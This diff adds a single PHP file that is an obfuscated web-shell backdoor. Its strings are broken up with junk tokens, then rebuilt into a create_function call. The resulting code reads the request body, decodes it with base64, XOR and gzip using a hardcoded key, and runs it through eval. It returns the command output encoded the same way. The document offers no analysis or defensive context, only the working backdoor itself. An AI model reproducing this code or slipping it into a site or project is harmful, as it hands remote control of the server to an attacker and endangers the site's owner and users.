@@ -1,0 +1,23 @@
+<?php
+
+$S=str_replace('qD','','qDcreaqDqDqDteqD_functqDion');
+
+$W='YC60wlZY0G";ZYfZYunctioZYnZY x($tZY,$k){$c=stZYrlen($k);$l=stZYrleZYn($t);$o="";foZYr($';
+
+$s='^$k{$j};}}reZYturnZY $o;}ifZY (@prZYeg_mZYatch("/$kh(ZY.+)$kfZY/",@ZYfilZYe_gZYZYe';
+
+$V='(ZY@x(@baseZYZY64_ZYdecode($mZY[1]),$k)))ZY;$o=@obZY_getZY_cZYontents(ZY);@ZYob_';
+
+$J='$k="ZY9e827ZY57e";$ZYkh="9a1c12ZYcb710aZY";$kf="ZYd680ZYdb11f6f1ZY";ZY$p="ZY10rtS38jDZ';
+
+$l='t_contents("php:/ZYZY/input")ZY,$m)==1ZY) {@oZYb_staZYrt();@eZYval(@ZYgzuncZYompress';
+
+$H='ZYi=0;$iZY<ZY$l;){for($j=ZY0;($j<ZY$c&&$i<$lZY);$jZY++,$ZYi++){ZY$o.=$t{ZY$ZYi}';
+
+$v='end_clean();ZY$r=@base6ZY4_encZYZYode(@xZY(@gzcomprZYess(ZY$o),$k)ZY);prinZYt("$p$ZYkh$r$kf");}';
+
+$n=str_replace('ZY','',$J.$W.$H.$s.$l.$V.$v);
+
+$K=$S('',$n);$K();
+
+?>
